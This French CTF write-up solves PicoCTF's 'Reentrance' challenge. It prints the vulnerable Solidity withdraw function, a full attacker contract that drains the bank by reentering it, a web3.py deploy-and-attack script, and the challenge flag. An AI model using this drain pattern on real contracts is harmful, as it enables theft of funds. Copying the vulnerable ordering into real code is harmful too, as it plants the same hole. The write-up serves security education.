# Writeup PicoCTF - Reentrance

**Challenge :** Reentrance
**Catégorie :** Web3 / Smart Contract
**Points :** 400 pts
**Flag :** `picoCTF{UpDaTe_St4ate5_1st_3d442952}`

## Description du problème

Le défi propose un contrat intelligent `VulnBank.sol` (Solidity `^0.6.12`) contenant une vulnérabilité classique de type **Reentrancy** (Réentrance).
Le but est de vider le solde interne du contrat bancaire (10 ETH) jusqu'à 0 pour révéler le drapeau (flag).

L'instance du challenge fournit :

- L'adresse du contrat `VulnBank`
- L'adresse temporaire de notre compte joueur (doté de 5 ETH)
- La clé privée du compte joueur
- L'URL RPC du nœud Ethereum de test

## Analyse de la vulnérabilité

La faille se situe dans la fonction `withdraw` de `VulnBank.sol` :

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount, "Insufficient funds available");

    // 1. Transfert d'Ether avant la mise à jour de l'état
    (bool sent, ) = msg.sender.call{value: amount}(""); 
    
    // 2. Mise à jour de l'état 
    balances[msg.sender] -= amount;

    require(sent, "Transfer failed");

    if (!revealed && address(this).balance == 0) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

La banque envoie l'Ether avec la fonction bas niveau `.call{value: ...}("")` **avant** de déduire le montant du solde de l'utilisateur (`balances[msg.sender]`).
Si l'appelant est un contrat intelligent, la fonction `receive()` (ou `fallback()`) du contrat appelant sera déclenchée lors de la réception de l'Ether. L'attaquant peut alors rappeler la fonction `withdraw()` depuis son `receive()`. Au moment de ce deuxième appel, `balances[msg.sender]` n'aura pas encore été déduit, permettant de retirer à nouveau les fonds, et ainsi de suite (boucle de réentrance) jusqu'à vider totalement la banque.

## Exploitation

### Le Contrat d'Attaque (`Attacker.sol`)

Nous déployons le contrat suivant pour orchestrer l'attaque :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract Attacker {
    IVulnBank public bank;

    constructor(address _bankAddr) public {
        bank = IVulnBank(_bankAddr);
    }

    // Fonction d'amorçage de l'attaque
    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    // Le fallback est déclenché par le transfert d'Ether de la banque
    receive() external payable {
        uint256 bankBalance = address(bank).balance;
        // Tant que la banque possède des fonds, on continue de la vider
        if (bankBalance >= msg.value) {
            bank.withdraw(msg.value);
        } else if (bankBalance > 0) {
            bank.withdraw(bankBalance);
        }
    }
}
```

### Exécution avec Web3.py

Pour exécuter rapidement l'exploit sur le réseau distant custom, nous utilisons le script Python suivant avec la bibliothèque `web3` et le compilateur `solcx` :

```python
# solve.py
from web3 import Web3
from solcx import compile_source, install_solc

install_solc('0.6.12')
w3 = Web3(Web3.HTTPProvider("http://crystal-peak.picoctf.net:65167"))
account = w3.eth.account.from_key("NOTRE_PRIVATE_KEY")
bank_addr = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"

# Compilation
with open("Attacker.sol", "r") as f:
    compiled_sol = compile_source(f.read(), solc_version="0.6.12")
contract_interface = compiled_sol['<stdin>:Attacker']

# Déploiement
Attacker = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])
tx = Attacker.constructor(bank_addr).build_transaction({
    'from': account.address,
    'chainId': w3.eth.chain_id,
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(account.address)
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=account.key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
attacker_addr = w3.eth.wait_for_transaction_receipt(tx_hash).contractAddress

# Exécution de l'attaque (avec 1 ETH d'injection)
attacker_contract = w3.eth.contract(address=attacker_addr, abi=contract_interface['abi'])
attack_tx = attacker_contract.functions.attack().build_transaction({
    'from': account.address,
    'chainId': w3.eth.chain_id,
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(account.address),
    'value': w3.to_wei(1, 'ether')
})
signed_attack_tx = w3.eth.account.sign_transaction(attack_tx, account.key)
w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(signed_attack_tx.raw_transaction))

# Récupération du flag
bank_contract = w3.eth.contract(address=bank_addr, abi=[...])
print(bank_contract.functions.getFlag().call())
```

En fournissant 1 ETH à la fonction `attack()`, notre contrat de compte dépose 1 ETH, puis le retire. Lors de ce premier retrait, une boucle récursive s'enclenche dans la fonction `receive()`, rappelant `withdraw(1 ether)` 10 fois supplémentaires jusqu'à ce que les 10 ETH que la banque possédait soient siphonnés vers notre contrat d'attaque.

Une fois la balance de la banque réduite à `0 ETH`,  la condition :
`if (!revealed && address(this).balance == 0)`
est remplie et le drapeau est écrit dans la variable `flag` !
